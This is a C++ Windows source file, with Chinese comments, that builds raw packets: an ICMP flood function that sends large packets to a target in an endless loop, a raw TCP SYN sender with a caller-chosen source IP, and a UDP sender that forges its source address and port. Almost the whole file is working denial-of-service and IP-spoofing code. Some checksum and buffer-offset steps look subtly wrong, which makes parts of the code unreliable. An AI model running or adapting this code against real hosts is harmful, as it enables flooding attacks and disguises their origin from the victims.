// TestSocket.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

BOOL ICMPFlood(LPSTR lpszDestIP, INT nPacketSize);
BOOL PSD_IP(char* lpszSourceIP,INT nSourcePort, char* lpszDestIP, INT nDestPort);
BOOL UDPFakeIP(char* lpszSrcIP,INT nSrcPort, char* lpszDestIP, INT nDestPort);

USHORT CheckSum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	while(size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if(size)
	{
		cksum += *(UCHAR*)buffer;
	}

	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}

int _tmain(int argc, _TCHAR* argv[])
{
	//PSD_IP("192.68.25.5", 1235, "192.168.27.252", 2552);
	UDPFakeIP("192.68.25.5", 1235, "192.168.27.252", 2552);
	//ICMPFlood("192.168.27.252",55555);
	::getchar();
}

// ICMP报文洪水攻击
BOOL ICMPFlood(char* lpszDestIP, INT nPacketSize)
{
	WSADATA WSAData;
	SOCKET sock;
	SOCKADDR_IN addr_in;
	ICMP_HEADER icmpHeader; // 声明ICMP报头
	INT nTimeOut = 2000, nSendSEQ = 0, nType = 8, nCode = 0, nCounter = 0, nDataSize;
	char SendBuff[65535] = {0};

	if(nPacketSize > 65500)
	{
		printf("PacketSize Error!\n");
		return FALSE;
	}

	// 初始化WinSock
	if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0)
	{
		printf("WSAStartup Error!\n");
		return FALSE;
	}

	// 创建原创套接字
	sock = WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED);

	if (sock == INVALID_SOCKET)
	{
		printf("Socket Setup Error!\n");
		return FALSE;
	}

	// 设置套接字选项
	INT nRet = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOut, sizeof(nTimeOut));

	if (nRet == SOCKET_ERROR)
	{
		printf("setsockopt SO_SNDTIMEO error!\n");
		return FALSE;
	}

	printf("Starting ICMP Flood...\n\n");

	addr_in.sin_family = AF_INET;
	addr_in.sin_addr.S_un.S_addr = inet_addr(lpszDestIP);

	icmpHeader.i_type = nType;
	icmpHeader.i_code = nCode;
	icmpHeader.i_cksum = nCounter;
	icmpHeader.i_seq = nSendSEQ;
	icmpHeader.timestamp = ::GetTickCount();

	::memcpy(SendBuff,&icmpHeader,sizeof(icmpHeader));
	::memset(SendBuff + sizeof(icmpHeader),'E',nPacketSize);

	icmpHeader.i_cksum = CheckSum((USHORT*)SendBuff, sizeof(icmpHeader) + nPacketSize);
	nDataSize = sizeof(icmpHeader) + nPacketSize;

	while(1)
	{
		printf("Sending 1024 packets...\n");
		
		for(int i = 0; i < 1024; i++)
		{
			nRet = sendto(sock, SendBuff, nDataSize, 0, (SOCKADDR*)&addr_in, sizeof(addr_in));
			if(nRet == SOCKET_ERROR)
			{
				printf("\nSend Error:%d\n", GetLastError());
			}
		}
	}
	
	if(sock != INVALID_SOCKET)
	{
		closesocket(sock);
	}
	
	WSACleanup();
	
	return TRUE;
}

BOOL PSD_IP(char* lpszSourceIP,INT nSourcePort, char* lpszDestIP, INT nDestPort)
{
	WSADATA WSAData;
	SOCKET sock;
	SOCKADDR_IN addr_in;
	IP_HEADER ipHeader;
	TCP_HEADER tcpHeader;
	PSD_HEADER psdHeader;

	char szSendBuf[60] = {0};

	if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0)
	{
		printf("WSAStartup Error!\n");
		return FALSE;
	}

	sock = WSASocket(AF_INET,SOCK_RAW,IPPROTO_TCP,NULL,0,WSA_FLAG_OVERLAPPED);

	if (sock == INVALID_SOCKET)
	{
		printf("Socket Setup Error!\n");
		return FALSE;
	}

	BOOL bFlag = TRUE;
	INT nRet = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&bFlag, sizeof(bFlag));

	if(nRet == SOCKET_ERROR)
	{
		printf("setsockopt IP_HDRINCL error!\n");
		return FALSE;
	}

	INT nTimeOver = 1000;
	nRet = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOver, sizeof(nTimeOver));

	if (nRet == SOCKET_ERROR)
	{
		printf("setsockopt SO_SNDTIMEO error!\n");
		return FALSE;
	}

	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(nDestPort);
	addr_in.sin_addr.S_un.S_addr = inet_addr(lpszDestIP);

	//填充IP首部
	ipHeader.h_lenver = (4 << 4 | sizeof(ipHeader) / sizeof(unsigned long));
	// ipHeader.tos=0;
	ipHeader.total_len = htons(sizeof(ipHeader) + sizeof(tcpHeader));
	ipHeader.ident = 1;
	ipHeader.frag_and_flags = 0;
	ipHeader.ttl = 128;
	ipHeader.proto = IPPROTO_TCP;
	ipHeader.checksum = 0;
	ipHeader.sourceIP = inet_addr(lpszSourceIP);
	ipHeader.destIP = inet_addr(lpszDestIP);

	//填充TCP首部
	tcpHeader.th_dport = htons(nDestPort);
	tcpHeader.th_sport = htons(nSourcePort); //源端口号
	tcpHeader.th_seq = htonl(0x12345678);
	tcpHeader.th_ack = 0;
	tcpHeader.th_lenres = (sizeof(tcpHeader) / 4 << 4 | 0);
	tcpHeader.th_flag = 2; //修改这里来实现不同的标志位探测，2是SYN，1是FIN，16是ACK探测 等等
	tcpHeader.th_win = htons(512);
	tcpHeader.th_urp = 0;
	tcpHeader.th_sum = 0;

	psdHeader.saddr = ipHeader.sourceIP;
	psdHeader.daddr = ipHeader.destIP;
	psdHeader.mbz = 0;
	psdHeader.ptcl = IPPROTO_TCP;
	psdHeader.tcpl = htons(sizeof(tcpHeader));

	memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
	memcpy(szSendBuf + sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
	tcpHeader.th_sum = CheckSum((USHORT*)szSendBuf, sizeof(psdHeader) + sizeof(tcpHeader));

	memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
	memcpy(szSendBuf + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
	memset(szSendBuf + sizeof(ipHeader) + sizeof(tcpHeader), 'A', 4);
	ipHeader.checksum = CheckSum((USHORT *)szSendBuf, sizeof(ipHeader) + sizeof(tcpHeader));

	//memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));

	INT nDataSize = sizeof(ipHeader) + sizeof(tcpHeader) + 4;
	nRet = sendto(sock, szSendBuf, nDataSize, 0, (SOCKADDR*)&addr_in, sizeof(addr_in));

	if(nRet == SOCKET_ERROR)
	{
		printf("send error!:%d\n",WSAGetLastError());
		return FALSE;
	}else{
		printf("send ok!\n");
	}

	closesocket(sock);
	WSACleanup();

	return TRUE;
}

BOOL UDPFakeIP(char* lpszSrcIP,INT nSrcPort, char* lpszDestIP, INT nDestPort)
{
	WSADATA WSAData;
	SOCKET sock;
	SOCKADDR_IN addr_in;
	IP_HEADER ipHeader;
	UDP_HEADER udpHeader;

	char szSendBuf[300] = {0};
	const char *strMessage = "treat demo"; 

	if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0)
	{
		printf("WSAStartup Error!\n");
		return FALSE;
	}

	sock = WSASocket(AF_INET,SOCK_RAW,IPPROTO_IP,NULL,0,WSA_FLAG_OVERLAPPED);

	if (sock == INVALID_SOCKET)
	{
		printf("Socket Setup Error!\n");
		return FALSE;
	}

	BOOL bFlag = TRUE;
	INT nRet = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&bFlag, sizeof(bFlag));

	if(nRet == SOCKET_ERROR)
	{
		printf("setsockopt IP_HDRINCL error!\n");
		return FALSE;
	}

	INT nTimeOver = 1000;
	nRet = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOver, sizeof(nTimeOver));

	if (nRet == SOCKET_ERROR)
	{
		printf("setsockopt SO_SNDTIMEO error!\n");
		return FALSE;
	}

	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(nDestPort);
	addr_in.sin_addr.S_un.S_addr = inet_addr(lpszDestIP);

	const unsigned short iIPSize = sizeof(ipHeader) / sizeof(unsigned long);
	const unsigned short iUdpSize = sizeof(udpHeader) + strlen(strMessage);
	const unsigned short iIPVersion = 4;
	const unsigned short iTotalSize = sizeof(ipHeader) + sizeof(udpHeader) + strlen(strMessage);

	ipHeader.h_lenver = (iIPVersion << 4) | iIPSize;
	ipHeader.tos = 0; // IP type of service
	ipHeader.total_len = htons(iTotalSize); // Total packet len
	ipHeader.ident = 0; // Unique identifier: set to 0
	ipHeader.frag_and_flags = 0; // Fragment offset field
	ipHeader.ttl = 128; // 生存时间
	ipHeader.proto = IPPROTO_UDP; //0x11; // Protocol(UDP)
	ipHeader.checksum = 0; // 较验和
	ipHeader.destIP = inet_addr(lpszDestIP); // 接收方IP地址
	ipHeader.sourceIP = inet_addr(lpszSrcIP); // 发送方伪造的IP地址

	udpHeader.uh_dport = htons(nDestPort); // 接收方端口
	udpHeader.uh_sport = htons(nSrcPort); // 发送伪造的端口
	udpHeader.uh_len = htons(iUdpSize);
	udpHeader.uh_sum = 0;

	memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
	ipHeader.checksum = CheckSum((USHORT *)szSendBuf, sizeof(ipHeader));
	memcpy(szSendBuf + sizeof(ipHeader), &udpHeader, sizeof(udpHeader));
	memcpy(szSendBuf + sizeof(udpHeader), strMessage, strlen(strMessage));
	udpHeader.uh_sum = CheckSum((USHORT *)szSendBuf, sizeof(ipHeader) + sizeof(udpHeader) + strlen(strMessage));


	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(nDestPort);
	addr_in.sin_addr.s_addr = inet_addr(lpszDestIP);

	nRet = sendto(sock, szSendBuf, iTotalSize, 0, (SOCKADDR*)&addr_in, sizeof(addr_in));

	if(nRet == SOCKET_ERROR)
	{
		printf("sendto() failed: %d ", WSAGetLastError());
	}else{
		printf("sent %d bytes ", nRet);
	}
	
	closesocket(sock);
	WSACleanup();

	return TRUE;
}